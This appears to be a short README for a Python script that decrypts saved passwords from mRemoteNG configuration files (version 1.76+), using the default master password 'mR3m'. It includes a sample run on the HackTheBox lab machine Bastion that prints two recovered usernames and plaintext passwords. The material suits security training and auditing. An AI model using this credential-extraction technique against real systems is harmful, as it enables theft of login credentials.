## Description

This tool is will attempt to extract passwords from an mRemoteNG configuration file for version 1.76 or later.

## Usage

Call the python script passing the configuration file as well as an optional master password. The script will use "mR3m" if none is provided. 

```
root@kali:~/hackthebox/bastion-10.10.10.134# ./mRemoteNG_decrypter.py confCons.xml mR3m
[+] Found nodes: 2

Username: Administrator
Password: thXLHM96BeKL0ER2

Username: L4mpje
Password: bureaulampje
```
